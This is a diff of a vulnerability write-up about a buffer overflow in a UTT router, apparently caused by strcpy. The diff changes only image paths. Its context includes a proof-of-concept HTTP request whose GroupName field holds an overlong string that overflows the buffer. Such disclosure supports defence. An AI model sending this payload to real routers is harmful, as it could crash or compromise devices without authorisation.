@@ -18,15 +18,15 @@ A serious buffer overflow vulnerability was found on the UTT router Aggressive  
 
 The API for invoking the function
 
-![image-20260211153219800](16/image-20260211153219800.png)
+![image-20260211153219800](images/image-20260211153219800.png)
 
 You can see that some values are taken here
 
-![image-20260211153240299](16/image-20260211153240299.png)
+![image-20260211153240299](images/image-20260211153240299.png)
 
 Here the replication via strpy results in an overflow
 
-![image-20260211153300987](16/image-20260211153300987.png)
+![image-20260211153300987](images/image-20260211153300987.png)
 
 # POC
 
@@ -50,4 +50,5 @@ Connection: close
 PolicyName=test_policy&PolicyEnable=1&Profile=myprofile&sourceIP=group&GroupName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&dstIP=ipRange&dstFromIP=10.0.0.1&dstEndIP=10.0.0.100&Protocol=6&DesFromPort=80&DesEndPort=80&Action=add&day=127&timestart=09:00&timestop=17:00
 ```
 
-![image-20251118224225970](16/image-20251118224225970.png)
+![image-20251118224225970](images/image-20251118224225970.png)
+
